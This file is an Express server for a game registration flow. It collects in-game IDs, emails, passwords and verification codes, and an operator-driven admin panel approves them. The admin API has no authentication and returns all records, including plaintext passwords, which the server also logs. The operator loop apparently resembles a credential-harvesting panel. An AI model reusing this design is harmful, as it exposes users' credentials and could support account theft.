// server.js (COMMONJS, admin HTML instead of Telegram)

const path = require("path");
const express = require("express");
const morgan = require("morgan");

const app = express();
const PORT = process.env.PORT || 3000;

// ===== MIDDLEWARE =====
app.use(morgan("dev"));
app.use(express.json());

// ===== STATIC =====
const PUBLIC_DIR = path.join(__dirname, "public");

app.use(
  express.static(PUBLIC_DIR, {
    maxAge: "1h",
    index: "index.html",
  })
);

// health-check для Render
app.get("/healthz", (req, res) => {
  res.json({ ok: true });
});

// корень — основной сайт / хаб
app.get("/", (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

// админка — public/admin/index.html
app.get("/admin", (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "admin", "index.html"));
});

// ===== IN-MEMORY STORAGE (для теста; после рестарта всё очищается) =====

let idCodeRequests = [];     // запросы на код для айди
let emailCodeRequests = [];  // запросы на код для почты
let registrations = [];      // финальные заявки
let seq = 1;

function genId() {
  return String(seq++);
}

function generateCode() {
  return String(Math.floor(100000 + Math.random() * 900000)); // 6 цифр
}

// ===== PUBLIC API (frontend регистрации) =====

// 1) запрос кода для ID
// body: { accessCode, ingameId, email }
app.post("/api/request-id-code", (req, res) => {
  const { accessCode, ingameId, email } = req.body || {};

  if (!accessCode || !ingameId || !email) {
    return res.status(400).json({ ok: false, error: "missing_fields" });
  }

  const now = new Date().toISOString();

  let rec = idCodeRequests.find(
    (r) =>
      r.accessCode === accessCode &&
      r.ingameId === ingameId &&
      r.email === email
  );

  if (!rec) {
    rec = {
      id: genId(),
      accessCode,
      ingameId,
      email,
      status: "pending", // pending | code_sent | valid | invalid
      lastCode: null,
      createdAt: now,
    };
    idCodeRequests.push(rec);
  }

  console.log("[ID REQUEST]", rec);
  return res.json({ ok: true, id: rec.id });
});

// 2) проверка кода для ID
// body: { accessCode, ingameId, email, code }
app.post("/api/verify-id-code", (req, res) => {
  const { accessCode, ingameId, email, code } = req.body || {};

  if (!accessCode || !ingameId || !email || !code) {
    return res.status(400).json({ status: "invalid", error: "missing_fields" });
  }

  const rec = idCodeRequests.find(
    (r) =>
      r.accessCode === accessCode &&
      r.ingameId === ingameId &&
      r.email === email
  );

  if (!rec || !rec.lastCode) {
    // код ещё не сгенерён / не отправлен
    return res.json({ status: "pending" });
  }

  if (rec.lastCode === String(code).trim()) {
    rec.status = "valid";
    return res.json({ status: "valid" });
  } else {
    rec.status = "invalid";
    return res.json({ status: "invalid" });
  }
});

// 3) запрос кода для EMAIL
// body: { accessCode, email, ingameId? }
app.post("/api/request-email-code", (req, res) => {
  const { accessCode, email, ingameId } = req.body || {};

  if (!accessCode || !email) {
    return res.status(400).json({ ok: false, error: "missing_fields" });
  }

  const now = new Date().toISOString();

  let rec = emailCodeRequests.find(
    (r) => r.accessCode === accessCode && r.email === email
  );

  if (!rec) {
    rec = {
      id: genId(),
      accessCode,
      email,
      ingameId: ingameId || null,
      status: "pending", // pending | code_sent | valid | invalid
      lastCode: null,
      createdAt: now,
    };
    emailCodeRequests.push(rec);
  }

  console.log("[EMAIL REQUEST]", rec);
  return res.json({ ok: true, id: rec.id });
});

// 4) проверка кода для EMAIL
// body: { accessCode, email, code }
app.post("/api/verify-email-code", (req, res) => {
  const { accessCode, email, code } = req.body || {};

  if (!accessCode || !email || !code) {
    return res.status(400).json({ status: "invalid", error: "missing_fields" });
  }

  const rec = emailCodeRequests.find(
    (r) => r.accessCode === accessCode && r.email === email
  );

  if (!rec || !rec.lastCode) {
    return res.json({ status: "pending" });
  }

  if (rec.lastCode === String(code).trim()) {
    rec.status = "valid";
    return res.json({ status: "valid" });
  } else {
    rec.status = "invalid";
    return res.json({ status: "invalid" });
  }
});

// 5) финальная заявка (после двух кодов)
// body: { accessCode, ingameId, email, password?, idCode?, emailCode? }
app.post("/api/submit-registration", (req, res) => {
  const {
    accessCode,
    ingameId,
    email,
    password,
    idCode,
    emailCode,
  } = req.body || {};

  if (!accessCode || !ingameId || !email) {
    return res.status(400).json({ ok: false, error: "missing_fields" });
  }

  const idReq = idCodeRequests.find(
    (r) =>
      r.accessCode === accessCode &&
      r.ingameId === ingameId &&
      r.email === email
  );
  const emailReq = emailCodeRequests.find(
    (r) => r.accessCode === accessCode && r.email === email
  );

  const idVerified = !!idReq && idReq.status === "valid";
  const emailVerified = !!emailReq && emailReq.status === "valid";

  const reg = {
    id: genId(),
    accessCode,
    ingameId,
    email,
    password: password || null,
    idCode: idCode || null,
    emailCode: emailCode || null,
    idVerified,
    emailVerified,
    status: "pending", // pending | approved | declined
    createdAt: new Date().toISOString(),
    declineReason: null,
    adminNote: null,
    slot: null,
    link: null,
  };

  registrations.push(reg);

  console.log("[REGISTRATION SUBMITTED]", reg);
  return res.json({ ok: true, id: reg.id });
});

// ===== ADMIN API (для HTML-админки) =====

// общее состояние: заявки на ID, EMAIL и финальные регистрации
app.get("/admin/api/state", (req, res) => {
  res.json({
    idCodeRequests,
    emailCodeRequests,
    registrations,
  });
});

// --- ID CODE admin actions ---

app.post("/admin/api/id-code/generate", (req, res) => {
  const { id } = req.body || {};
  const rec = idCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });

  const code = generateCode();
  rec.lastCode = code;
  rec.status = "code_sent";

  console.log("[ADMIN] Generated ID code", code, "for", rec.email, rec.ingameId);
  // TODO: здесь отправка письма rec.email с этим кодом
  res.json({ ok: true, code });
});

app.post("/admin/api/id-code/mark-valid", (req, res) => {
  const { id } = req.body || {};
  const rec = idCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });

  rec.status = "valid";
  res.json({ ok: true });
});

app.post("/admin/api/id-code/mark-invalid", (req, res) => {
  const { id } = req.body || {};
  const rec = idCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });

  rec.status = "invalid";
  res.json({ ok: true });
});

// --- EMAIL CODE admin actions ---

app.post("/admin/api/email-code/generate", (req, res) => {
  const { id } = req.body || {};
  const rec = emailCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });

  const code = generateCode();
  rec.lastCode = code;
  rec.status = "code_sent";

  console.log("[ADMIN] Generated EMAIL code", code, "for", rec.email);
  // TODO: здесь отправка письма rec.email с кодом
  res.json({ ok: true, code });
});

app.post("/admin/api/email-code/mark-valid", (req, res) => {
  const { id } = req.body || {};
  const rec = emailCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });

  rec.status = "valid";
  res.json({ ok: true });
});

app.post("/admin/api/email-code/mark-invalid", (req, res) => {
  const { id } = req.body || {};
  const rec = emailCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });

  rec.status = "invalid";
  res.json({ ok: true });
});

// --- REGISTRATION admin actions ---

// APPROVE: выдать слот и ссылку
// body: { id, slot, link, note }
app.post("/admin/api/registration/approve", (req, res) => {
  const { id, slot, link, note } = req.body || {};
  const reg = registrations.find((r) => r.id === String(id));
  if (!reg) return res.status(404).json({ ok: false, error: "not_found" });

  reg.status = "approved";
  reg.slot = slot || null;
  reg.link = link || null;
  reg.adminNote = note || null;

  console.log(
    "[ADMIN] APPROVED",
    reg.email,
    "slot=",
    slot,
    "link=",
    link,
    "note=",
    note
  );
  // TODO: отправить на reg.email письмо с таймингом и ссылкой на игру
  res.json({ ok: true });
});

// DECLINE: отклонить с причиной
// body: { id, reason, note }
app.post("/admin/api/registration/decline", (req, res) => {
  const { id, reason, note } = req.body || {};
  const reg = registrations.find((r) => r.id === String(id));
  if (!reg) return res.status(404).json({ ok: false, error: "not_found" });

  reg.status = "declined";
  reg.declineReason = reason || "other";
  reg.adminNote = note || null;

  console.log(
    "[ADMIN] DECLINED",
    reg.email,
    "reason=",
    reason,
    "note=",
    note
  );
  // TODO: отправить на reg.email письмо с причиной отказа
  res.json({ ok: true });
});

// ===== START SERVER =====
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
